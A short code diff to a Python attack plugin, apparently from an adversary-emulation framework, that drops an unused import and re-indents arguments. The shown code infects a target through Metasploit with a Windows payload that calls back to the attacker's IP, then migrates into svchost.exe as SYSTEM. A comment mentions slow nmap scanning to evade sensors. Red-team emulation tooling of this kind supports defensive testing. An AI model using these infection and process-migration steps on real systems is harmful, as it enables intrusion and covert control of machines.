@@ -3,7 +3,6 @@
 # A plugin to nmap targets slow motion, to evade sensors
 
 from plugins.base.attack import AttackPlugin, Requirement
-from app.metasploit import MetasploitInstant
 import socket
 
 
@@ -37,13 +36,13 @@ class MetasploitMigratePlugin(AttackPlugin):
         ip = socket.gethostbyname(self.attacker_machine_plugin.get_ip())
 
         self.metasploit.smart_infect(target,
-                                payload=payload_type,
-                                architecture="x64",
-                                platform="windows",
-                                lhost=ip,
-                                format="exe",
-                                outfile=payload_name
-                                )
+                                     payload=payload_type,
+                                     architecture="x64",
+                                     platform="windows",
+                                     lhost=ip,
+                                     format="exe",
+                                     outfile=payload_name
+                                     )
 
         self.metasploit.migrate(target, user="NT AUTHORITY\\SYSTEM", name="svchost.exe", arch="x64")
 
